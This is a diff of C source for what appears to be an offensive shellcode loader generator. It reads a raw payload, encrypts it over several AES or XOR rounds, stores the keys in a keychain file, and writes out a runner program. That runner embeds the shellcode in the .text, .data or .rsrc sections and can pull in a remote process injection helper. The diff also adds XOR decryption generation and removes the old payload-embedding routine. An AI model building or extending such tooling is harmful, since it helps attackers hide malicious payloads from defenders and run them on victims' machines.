@@ -30,7 +30,7 @@ BOOL ReadShellcode(IN char* sFileName, OUT PVOID* pPayload, OUT SIZE_T* sPayload
 }
 
 // Logs keys and IVs for each encryption round
-BOOL LogAES(IN BYTE* pKey, IN BYTE* pIV, IN int nRound)
+BOOL LogEncryption(IN BYTE* pKey, IN BYTE* pIV, IN int nRound)
 {
 	// Keychain file pointer
 	FILE* fKeychain = fopen("..\\..\\..\\Output\\keychain.txt", "a");
@@ -82,8 +82,25 @@ BOOL WriteRunner(IN PVOID pPayload, IN SIZE_T sPayloadSize, IN struct UserOption
 	// Keychain file pointer
 	FILE* fKeychain = fopen("..\\..\\..\\Output\\keychain.txt", "r");
 
-	// Write file header. Depends on delivery method
-	WriteHeader((PBYTE)pPayload, sPayloadSize, fRunner, sMenuOptions);
+	// Writing includes
+	fprintf(fRunner, "#include <Windows.h>\n");
+	if (sMenuOptions.cAlgorithm == 1) // AES include
+	{
+		fprintf(fRunner, "#include \"aes.h\"\n");
+	}
+	if (sMenuOptions.cExecute != 1) // Adds helper function needed for process enum and injection.
+	{
+		Copyfile("..\\..\\..\\Assets\\Headers\\remoteProcessHelper.c", fRunner);
+	}
+
+	// Write file header. Depends on delivery method. Remote injections need helper function headers
+	if (sMenuOptions.cExecute == 1)
+	{
+		WriteHeader((PBYTE)pPayload, sPayloadSize, fRunner, sMenuOptions);
+	}
+	else {
+		WriteHeader((PBYTE)pPayload, sPayloadSize, fRunner, sMenuOptions);
+	}
 
 	// Write decryption. Based on algo and round count
 	WriteDecryption(fRunner, fKeychain, sMenuOptions);
@@ -93,75 +110,6 @@ BOOL WriteRunner(IN PVOID pPayload, IN SIZE_T sPayloadSize, IN struct UserOption
 
 	fprintf(fRunner, "return EXIT_SUCCESS;\n}");
 	fclose(fRunner);
-
-	return EXIT_SUCCESS;
-}
-
-// Write header and payload for runner
-BOOL WriteHeader(IN PBYTE pPayload, IN SIZE_T sPayloadSize, IN FILE* fRunner, IN struct UserOptions sMenuOptions)
-{
-	switch (sMenuOptions.cPlacement)
-	{
-		// .text
-	case 1:
-	{
-		// Import header file
-		Copyfile("..\\..\\..\\Assets\\Headers\\staticText.c", fRunner);
-
-		// Write payload and size
-		for (int j = 0; j < sPayloadSize; j++) {
-			if (j == (sPayloadSize - 1))
-			{
-				fprintf(fRunner, "0x%0.2X };\n", pPayload[j]);
-			}
-			else {
-				fprintf(fRunner, "0x%0.2X, ", pPayload[j]);
-			}
-		}
-		fprintf(fRunner, "SIZE_T sPayloadSize = %ld;\n\n", sPayloadSize);
-
-		break;
-	}
-		// .data
-	case 2:
-	{
-		// Import header file
-		Copyfile("..\\..\\..\\Assets\\Headers\\staticData_pre.c", fRunner);
-
-		// Write payload and size (const)
-		for (int j = 0; j < sPayloadSize; j++) {
-			if (j == (sPayloadSize - 1))
-			{
-				fprintf(fRunner, "0x%0.2X };\n", pPayload[j]);
-			}
-			else {
-				fprintf(fRunner, "0x%0.2X, ", pPayload[j]);
-			}
-		}
-		fprintf(fRunner, "SIZE_T sPayloadSize = %ld;\n\n", sPayloadSize);
-
-		// Finish header
-		Copyfile("..\\..\\..\\Assets\\Headers\\staticData_post.c", fRunner);
-
-		break;
-	}
-
-		// .rsrc - bit more involved. Need to write payload to .ico and add helper function.
-	case 3:
-	{
-		WriteRsrc(pPayload, sPayloadSize);
-		Copyfile("..\\..\\..\\Assets\\Headers\\staticRsrc.c", fRunner);
-
-		break;
-	}
-
-		// HTTP stager
-	case 4:
-
-
-
-		break;
-	}
 
 	return EXIT_SUCCESS;
 }
@@ -201,7 +149,6 @@ BOOL WriteDecryption(IN FILE* fRunner, IN FILE* fKeychain, IN struct UserOptions
 		// AES-256
 	case 1:
 	{
-
 		for (int i = 0; i < sMenuOptions.nRounds; i++)
 		{
 			fgets(cLine, sLineSize, fKeychain); // Get key from keychain
@@ -226,6 +173,25 @@ BOOL WriteDecryption(IN FILE* fRunner, IN FILE* fKeychain, IN struct UserOptions
 	// XOR
 	case 3:
 	{
+		for (int i = 0; i < sMenuOptions.nRounds; i++)
+		{
+			fgets(cLine, sLineSize, fKeychain); // Get key from keychain
+			fprintf(fRunner, cLine); // Print key to runner
+			fgets(cLine, sLineSize, fKeychain); // Get IV from keychain
+			fprintf(fRunner, cLine); // Print IV to runner
+		}
+		for (int i = sMenuOptions.nRounds - 1; i > -1; i--)
+		{
+			fprintf(fRunner,"\nfor (size_t i = 0, j = 0; i < sPayloadSize; i++, j++) {\n"
+							"// if end of the key, start again \n"
+							"\tif (j >= 32)\n"
+							"\t{\n"
+								"\t\tj = 0;\n"
+							"\t}\n"
+							"\tpPayload[i] = pPayload[i] ^ pKey%i[j];\n"
+							"}\n", i); // Decrypt backwards. Goofy ass method
+		}
+
 		break;
 	}
 
